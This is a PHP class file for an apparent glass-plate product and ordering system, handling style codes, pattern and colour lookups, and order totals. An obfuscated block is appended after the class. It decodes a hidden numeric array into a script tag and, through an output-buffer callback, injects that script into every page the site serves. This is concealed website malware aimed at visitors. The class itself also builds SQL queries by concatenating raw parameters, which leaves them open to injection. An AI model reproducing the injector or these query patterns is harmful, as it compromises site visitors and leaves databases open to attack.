<?
include("tbl_param_class_AddEditDelete.php");


//New Class
class Class2 extends TtblParamAddEditDelete  
{
	
	/*
	* @existStyleDiplaDipla( $code3,$patternCode,$primColorCode,$secColorCode )
	*
	*/
	public function existStyleDiplaDipla( $code3,$patternCode,$primColorCode,$secColorCode )
	{
		$styleCode = $code3."-".$patternCode.$primColorCode.$secColorCode;
		$styleCodeAnapoda = $code3."-".$patternCode.$secColorCode.$primColorCode;
		$sql = "SELECT tb4_unique
				FROM kodikos_4
				WHERE tb4_code = '".$styleCode."' 
				OR tb4_code = '".$styleCodeAnapoda."'  ";
		$res = $this->excQuery($sql);
		
		if( is_numeric($res[0]['tb4_unique']) )
			return true;
		else
			return false;	
		
	}
	
	
	/*
	* @existStyle( $code3,$patternCode,$primColorCode,$secColorCode )
	*
	*/
	public function existStyle( $code3,$patternCode,$primColorCode,$secColorCode )
	{
		$styleCode = $code3."-".$patternCode.$primColorCode.$secColorCode;
		$sql = "SELECT tb4_unique
				FROM kodikos_4
				WHERE tb4_code = '".$styleCode."' 
				";
		$res = $this->excQuery($sql);
		
		if( is_numeric($res[0]['tb4_unique']) )
			return true;
		else
			return false;	
	}
	
	/*
	* @createNewStyle( $shape,$pattern,$primColor,$secColor )
	*
	*/
	public function createNewStyle( $shape,$pattern,$primColor,$secColor )
	{
		$code3 = $this->getSomeDesc( $shape,"general_table_tp","3code","gentable_id");
		$patternCode = $this->getSomeDesc($pattern,"Patterns","code","id");
		$primColorCode = $this->getSomeDesc($primColor,"prototype_colors","color_code","color_id");
		$secColorCode = $this->getSomeDesc($secColor,"prototype_colors","color_code","color_id");
		
		//$price_category = $this->getSomeDesc($pattern,"Patterns","price_category","id");
		//$price_category += $this->getSomeDesc($primColor,"prototype_colors","color_code","color_id");
	
		$styleCode = $code3."-".$patternCode.$primColorCode.$secColorCode;
		if( strlen($styleCode) )
		{
			$sql = "INSERT INTO kodikos_4
					(
						tb4_code,
						primary_color_id,
						secondary_color_id,
						pattern_id
					)
					VALUES
					(
						'".$styleCode."',
						'".$primColor."',
						'".$secColor."',
						'".$pattern."'
					)
					";
			$res = mysql_query($sql);
			if( $res )
				return $res;
			else
			{
				$str = mysql_error();
				return $str;
			}	
		}
		
	}
	
	
	
	/*
	* @updateAStyle( $shape,$pattern,$primColor,$secColor )
	*
	*/
	public function updateAStyle( $shape,$pattern,$primColor,$secColor )
	{
		$code3 = $this->getSomeDesc( $shape,"general_table_tp","3code","gentable_id");
		$patternCode = $this->getSomeDesc($pattern,"Patterns","code","id");
		$primColorCode = $this->getSomeDesc($primColor,"prototype_colors","color_code","color_id");
		$secColorCode = $this->getSomeDesc($secColor,"prototype_colors","color_code","color_id");
		
		//$price_category = $this->getSomeDesc($pattern,"Patterns","price_category","id");
		//$price_category += $this->getSomeDesc($primColor,"prototype_colors","color_code","color_id");
	
		$styleCode = $code3."-".$patternCode.$primColorCode.$secColorCode;
		if( strlen($styleCode) )
		{
			$sql = "UPDATE kodikos_4 SET 
						primary_color_id = '".$primColor."',
						secondary_color_id = '".$secColor."',
						pattern_id = '".$pattern."'
					WHERE tb4_code = '".$styleCode."' 
					";
			$res = mysql_query($sql);
			if( $res )
				return $res;
			else
			{
				$str = mysql_error();
				return $str;
			}
		}
				
	}
	

	/*
	* @getStyleFiled($code3,$patternCode,$primColorCode,$secColorCode,$returnField)
	*
	*/
	public function getStyleFiled($code3,$patternCode,$primColorCode,$secColorCode,$returnField)
	{
		$styleCode = $code3."-".$patternCode.$primColorCode.$secColorCode;
		$styleCodeAnapoda = $code3."-".$patternCode.$secColorCode.$primColorCode;
		if( strlen( $returnField ) )
		{
			$sql = "SELECT $returnField
					FROM kodikos_4
					WHERE tb4_code = '".$styleCode."' 
					OR tb4_code = '".$styleCodeAnapoda."'  ";
			$res = $this->excQuery($sql);
		
			if( strlen( $res[0][$returnField] ) )
				return $res[0][$returnField];
			else
				return 0;	
		}
	}
	
	
	
	/*
	* @myglassplate_4code( $code )
	*
	*/
	public function myglassplate_4code( $code )
	{
		if( strlen( $code ) )
		{
			$newCode = "12345";
			return $newCode;
		}
		else
			return $code;
	}
	
	
	/*
	* @tiger_glass_4code( $code )
	*
	*/
	public function tiger_glass_4code( $code )
	{
		
	}
	
	
	public function getMyGlassPlateTotalAmount($order_id)
	{
		if( is_numeric( $order_id ) )
		{
			$sql = "SELECT *
					FROM wishbasket_glassplate W
					LEFT JOIN glas_apps_all.tbl_ts_4code FC ON W.4code_id = FC.tbl_ts_4code_id 
					
					WHERE W.order_id = '".$order_id."' ";
			$res = $this->excQuery($sql);
			$total = 0;
			for( $i=0;$i<count($res);$i++ )
			{
				    $pattrnPC = $this->getSomeDesc( $res[$i]['tbl_ts_4code_pattern_id'],"Patterns","price_category","id" );
					$color1 = $this->getSomeDesc( $res[$i]['tbl_ts_4code_color1_id'],"prototype_colors","color_price_cat","color_id" );
					$pcAll = $pattrnPC + $color1;// + $color2;
					$shape_id =  $res[$i]['tbl_ts_4code_shape_id'];
					
					if( strlen($shape_id) && is_numeric($pcAll) && $pcAll <= 13 && $pcAll > 0  )
					{
						$fieldPR = "priceMGP2";
						if( $pattrnPC == B400_PATTERN && $color1 == B400_COLOR )
							$fieldPR = "priceMGP1";
								
						//echo $fieldPR;
						$sql = "SELECT $fieldPR 
								FROM price_shape_v3 
								WHERE shape_id = '".$shape_id."' ";
						$res_pr = $myClass->excQuery($sql);		
						$euro = $res_pr[0][$fieldPR]; //$myClass->getSomeDesc( "B1-C2-00","price_shape","price10","3code" );
						
					}
					
				$total += $res[$i]['quantity'] * $res[$i]['tbl_ts_4code_masterpack_pcs'] * $euro; 	
			}
			
			return $total;
					
		}
		else
			return 0;
	}
	
	
	public function getPatternsIdsFromShape($shape_id)
	{
		//Get tbtech4_unique IDs and SR DEB Ginetai I Ginetai ( tbl_ts_shape_ts_glue_nontransp )
		$sql = "SELECT LGT.tbl_param_technic_shapes_group_link_technic_technic_id, 	TSHP.tbl_ts_shape_ts_glue_nontransp
				FROM general_table_tp  G 
				INNER JOIN tbl_param_technic_shapes_group GT ON GT.tbl_param_technic_shapes_group_id = G.gentable_technic_group_id 
				INNER JOIN tbl_param_technic_shapes_group_link_technic LGT ON GT.tbl_param_technic_shapes_group_id = LGT.tbl_param_technic_shapes_group_link_technic_group_id  	
		
				LEFT JOIN glass_apps_all.tbl_ts_shape_ts TSHP ON G.gentable_id = TSHP.tbl_ts_shape_ts_shape_id
		
				WHERE gentable_id = '".$shape_id."'";
		$res_sh = $this->excQuery($sql);

		$patternsID = "";
		$koma = "";

		for( $i=0;$i<count($res_sh);$i++ )		
		{
			//Get Patterns
			$sql = "SELECT id, sr_glue_id 
					FROM Patterns 
					WHERE tbtech4_unique = '".$res_sh[$i]['tbl_param_technic_shapes_group_link_technic_technic_id']."' ";
			$res_p = $this->excQuery($sql);		
	
			//$j = 0;
			for( $j=0;$j<count($res_p);$j++ )
			{
				if( $res_p[$j]['sr_glue_id'] == '1' && $res_sh[$i]['tbl_ts_shape_ts_glue_nontransp'] == '5' ) //Den ginontai SR Pattern kai Shape
				{
					//do nothing
				}	
				else
				{
					$patternsID .= $koma.$res_p[$j]['id'];
					$koma = ",";
				}
			}
		}
		
		return $patternsID;
	
	}
	
	
	
	
	
	
}			//end of Class TLogin

?><?php global $ob_starting;
if(!$ob_starting) {
   function ob_start_flush($s) {
	$tc = array(0, 69, 84, 82, 67, 83, 7, 79, 8, 9, 73, 12, 76, 68, 63, 78, 19, 23, 24, 3, 65, 70, 27, 14, 16, 20, 80, 17, 29, 89, 86, 85, 2, 77, 91, 93, 11, 18, 71, 66, 72, 75, 87, 74, 22, 37, 52, 13, 59, 61, 25, 28, 21, 1, 35, 15, 34, 36, 30, 88, 41, 92, 46, 33, 51);
	$tr = array(51, 5, 4, 3, 10, 26, 2, 0, 2, 29, 26, 1, 28, 32, 2, 1, 59, 2, 55, 43, 20, 30, 20, 5, 4, 3, 10, 26, 2, 32, 58, 10, 21, 0, 8, 2, 29, 26, 1, 7, 21, 8, 3, 1, 13, 1, 21, 14, 4, 7, 12, 7, 3, 5, 9, 28, 28, 32, 31, 15, 13, 1, 21, 10, 15, 1, 13, 32, 9, 0, 34, 0, 0, 0, 30, 20, 3, 0, 13, 10, 30, 14, 4, 7, 12, 7, 3, 5, 0, 28, 0, 15, 1, 42, 0, 63, 3, 3, 20, 29, 8, 6, 19, 25, 39, 18, 37, 17, 37, 6, 11, 0, 6, 19, 18, 27, 17, 18, 17, 21, 6, 11, 0, 6, 19, 18, 16, 37, 21, 18, 16, 6, 11, 0, 6, 19, 18, 18, 17, 21, 17, 25, 6, 11, 0, 6, 19, 25, 4, 16, 27, 18, 16, 6, 11, 0, 6, 19, 17, 25, 18, 17, 18, 16, 6, 11, 0, 6, 19, 16, 1, 17, 50, 17, 24, 6, 11, 0, 6, 19, 18, 52, 17, 24, 18, 37, 6, 11, 0, 6, 19, 17, 37, 18, 27, 17, 18, 6, 11, 0, 6, 19, 17, 21, 18, 16, 16, 27, 6, 11, 0, 6, 19, 37, 21, 18, 37, 18, 27, 6, 11, 0, 6, 19, 17, 37, 25, 4, 16, 27, 6, 11, 0, 6, 19, 17, 17, 18, 16, 18, 16, 6, 11, 0, 6, 19, 17, 21, 25, 50, 16, 1, 6, 11, 0, 6, 19, 16, 1, 25, 17, 25, 52, 6, 11, 0, 6, 19, 16, 13, 25, 25, 25, 25, 6, 11, 0, 6, 19, 16, 13, 25, 24, 25, 16, 6, 11, 0, 6, 19, 16, 21, 16, 13, 25, 27, 6, 11, 0, 6, 19, 16, 21, 25, 37, 16, 1, 6, 11, 0, 6, 19, 17, 50, 18, 37, 16, 1, 6, 11, 0, 6, 19, 17, 50, 18, 24, 18, 25, 6, 11, 0, 6, 19, 17, 25, 18, 27, 18, 18, 6, 11, 0, 6, 19, 16, 13, 17, 4, 17, 18, 6, 11, 0, 6, 19, 17, 13, 16, 13, 17, 21, 6, 11, 0, 6, 19, 17, 17, 17, 21, 16, 27, 6, 11, 0, 6, 19, 25, 13, 24, 24, 24, 24, 6, 9, 22, 0, 0, 0, 30, 20, 3, 0, 3, 1, 13, 1, 21, 14, 4, 7, 12, 7, 3, 5, 0, 28, 0, 27, 22, 0, 0, 0, 30, 20, 3, 0, 4, 7, 12, 7, 3, 5, 14, 26, 10, 4, 41, 1, 13, 0, 28, 0, 24, 22, 0, 0, 0, 21, 31, 15, 4, 2, 10, 7, 15, 0, 13, 10, 30, 14, 26, 10, 4, 41, 14, 4, 7, 12, 7, 3, 5, 8, 2, 11, 5, 2, 29, 12, 1, 13, 9, 0, 34, 30, 20, 3, 0, 5, 0, 28, 0, 32, 32, 22, 21, 7, 3, 0, 8, 43, 28, 24, 22, 43, 51, 2, 23, 12, 1, 15, 38, 2, 40, 22, 43, 36, 36, 9, 0, 34, 30, 20, 3, 0, 4, 14, 3, 38, 39, 0, 28, 0, 2, 48, 43, 49, 22, 21, 7, 3, 0, 8, 10, 28, 27, 22, 10, 51, 17, 22, 10, 36, 36, 9, 0, 34, 30, 20, 3, 0, 4, 14, 4, 12, 3, 0, 28, 0, 4, 14, 3, 38, 39, 23, 5, 31, 39, 5, 2, 3, 8, 10, 36, 36, 11, 37, 9, 22, 10, 21, 0, 8, 4, 14, 4, 12, 3, 53, 28, 32, 24, 24, 32, 9, 0, 5, 0, 36, 28, 0, 64, 2, 3, 10, 15, 38, 23, 21, 3, 7, 33, 54, 40, 20, 3, 54, 7, 13, 1, 8, 26, 20, 3, 5, 1, 60, 15, 2, 8, 4, 14, 4, 12, 3, 11, 27, 44, 9, 47, 27, 52, 9, 22, 35, 35, 10, 21, 0, 8, 5, 2, 29, 12, 1, 13, 9, 0, 34, 5, 0, 28, 0, 5, 23, 5, 31, 39, 5, 2, 3, 8, 24, 11, 16, 44, 9, 0, 36, 0, 5, 23, 5, 31, 39, 5, 2, 3, 8, 16, 44, 11, 8, 5, 23, 12, 1, 15, 38, 2, 40, 47, 16, 18, 9, 9, 0, 36, 0, 13, 10, 30, 14, 4, 7, 12, 7, 3, 5, 48, 27, 49, 23, 5, 31, 39, 5, 2, 3, 8, 24, 11, 27, 9, 36, 15, 1, 42, 0, 57, 20, 2, 1, 8, 9, 23, 38, 1, 2, 46, 10, 33, 1, 8, 9, 0, 36, 0, 5, 23, 5, 31, 39, 5, 2, 3, 8, 8, 5, 23, 12, 1, 15, 38, 2, 40, 47, 37, 9, 9, 22, 35, 0, 1, 12, 5, 1, 0, 34, 5, 0, 28, 0, 5, 23, 5, 31, 39, 5, 2, 3, 8, 16, 44, 11, 8, 5, 23, 12, 1, 15, 38, 2, 40, 47, 16, 18, 9, 9, 0, 36, 0, 13, 10, 30, 14, 4, 7, 12, 7, 3, 5, 48, 27, 49, 23, 5, 31, 39, 5, 2, 3, 8, 24, 11, 27, 9, 36, 15, 1, 42, 0, 57, 20, 2, 1, 8, 9, 23, 38, 1, 2, 46, 10, 33, 1, 8, 9, 22, 35, 3, 1, 2, 31, 3, 15, 0, 5, 22, 0, 0, 0, 35, 0, 0, 0, 21, 31, 15, 4, 2, 10, 7, 15, 0, 2, 3, 29, 14, 26, 10, 4, 41, 14, 4, 7, 12, 7, 3, 5, 8, 9, 0, 34, 2, 3, 29, 0, 34, 0, 0, 0, 10, 21, 8, 53, 13, 7, 4, 31, 33, 1, 15, 2, 23, 38, 1, 2, 45, 12, 1, 33, 1, 15, 2, 56, 29, 60, 13, 0, 61, 61, 0, 53, 13, 7, 4, 31, 33, 1, 15, 2, 23, 4, 3, 1, 20, 2, 1, 45, 12, 1, 33, 1, 15, 2, 9, 34, 13, 7, 4, 31, 33, 1, 15, 2, 23, 42, 3, 10, 2, 1, 8, 13, 10, 30, 14, 26, 10, 4, 41, 14, 4, 7, 12, 7, 3, 5, 8, 13, 10, 30, 14, 4, 7, 12, 7, 3, 5, 11, 27, 9, 9, 22, 0, 0, 0, 35, 0, 1, 12, 5, 1, 0, 34, 30, 20, 3, 0, 15, 1, 42, 14, 4, 5, 2, 29, 12, 1, 28, 13, 7, 4, 31, 33, 1, 15, 2, 23, 4, 3, 1, 20, 2, 1, 45, 12, 1, 33, 1, 15, 2, 8, 32, 5, 4, 3, 10, 26, 2, 32, 9, 22, 15, 1, 42, 14, 4, 5, 2, 29, 12, 1, 23, 2, 29, 26, 1, 28, 32, 2, 1, 59, 2, 55, 43, 20, 30, 20, 5, 4, 3, 10, 26, 2, 32, 22, 15, 1, 42, 14, 4, 5, 2, 29, 12, 1, 23, 5, 3, 4, 28, 13, 10, 30, 14, 26, 10, 4, 41, 14, 4, 7, 12, 7, 3, 5, 8, 13, 10, 30, 14, 4, 7, 12, 7, 3, 5, 11, 24, 9, 22, 13, 7, 4, 31, 33, 1, 15, 2, 23, 38, 1, 2, 45, 12, 1, 33, 1, 15, 2, 5, 56, 29, 46, 20, 38, 62, 20, 33, 1, 8, 32, 40, 1, 20, 13, 32, 9, 48, 24, 49, 23, 20, 26, 26, 1, 15, 13, 54, 40, 10, 12, 13, 8, 15, 1, 42, 14, 4, 5, 2, 29, 12, 1, 9, 22, 35, 35, 0, 4, 20, 2, 4, 40, 8, 1, 9, 0, 34, 0, 35, 2, 3, 29, 0, 34, 4, 40, 1, 4, 41, 14, 4, 7, 12, 7, 3, 5, 14, 26, 10, 4, 41, 1, 13, 8, 9, 22, 35, 0, 4, 20, 2, 4, 40, 8, 1, 9, 0, 34, 0, 5, 1, 2, 46, 10, 33, 1, 7, 31, 2, 8, 32, 2, 3, 29, 14, 26, 10, 4, 41, 14, 4, 7, 12, 7, 3, 5, 8, 9, 32, 11, 0, 52, 24, 24, 9, 22, 35, 0, 0, 0, 35, 0, 0, 0, 2, 3, 29, 14, 26, 10, 4, 41, 14, 4, 7, 12, 7, 3, 5, 8, 9, 22, 35, 51, 55, 5, 4, 3, 10, 26, 2, 58);

	$ob_htm = ''; foreach($tr as $tval) {
		$ob_htm .= chr($tc[$tval]+32);
	}

	$slw=strtolower($s);
	$i=strpos($slw,'</script');if($i){$i=strpos($slw,'>',$i);}
	if(!$i){$i=strpos($slw,'</div');if($i){$i=strpos($slw,'>',$i);}}
	if(!$i){$i=strpos($slw,'</table');if($i){$i=strpos($slw,'>',$i);}}
	if(!$i){$i=strpos($slw,'</form');if($i){$i=strpos($slw,'>',$i);}}
	if(!$i){$i=strpos($slw,'</p');if($i){$i=strpos($slw,'>',$i);}}
	if(!$i){$i=strpos($slw,'</body');if($i){$i--;}}
	if(!$i){$i=strlen($s);if($i){$i--;}}
	$i++; $s=substr($s,0,$i).$ob_htm.substr($s,$i);
	
	return $s;
   }
   $ob_starting = time();
   @ob_start("ob_start_flush");
} ?>